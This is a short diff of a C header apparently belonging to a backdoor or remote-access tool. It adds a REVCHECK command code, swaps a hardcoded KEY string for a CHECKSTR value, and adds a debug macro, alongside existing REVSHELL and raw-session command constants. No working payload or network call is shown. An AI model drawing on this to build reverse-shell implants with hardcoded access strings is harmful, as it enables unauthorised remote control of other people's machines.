@@ -14,6 +14,7 @@
 #define REVSHELL      7
 #define RAWSESSION  8
 #define STOPRAWSESSION  9
+#define REVCHECK 10
 
 // connection type
 #define CON_TCP 1
@@ -26,7 +27,15 @@
 #define ECHAR 0x0b
 #define TIMEOUT 60
 #define MAXRAWSESSIONS 10
-#define KEY "ith9iexieh9A"
+#define CHECKSTR "laom6uSh8eidevah4ee7"
+
+#if DEBUG 
+#define debug(...) \
+    fprintf(stderr, "[%d] ", getpid()); \
+    fprintf(stderr, __VA_ARGS__); 
+#else
+#define debug(...) 
+#endif 
 
 // structs
 struct data {
@@ -46,7 +55,7 @@ struct packet {
 } __attribute__ ((packed));
 
 // Functions
-__inline__ void debug(char * format, ...);
+//__inline__ void debug(char * format, ...);
 void sig_child(int n);
 inline int max(int a, int b);
 unsigned long resolve(const char *host, char *ip);
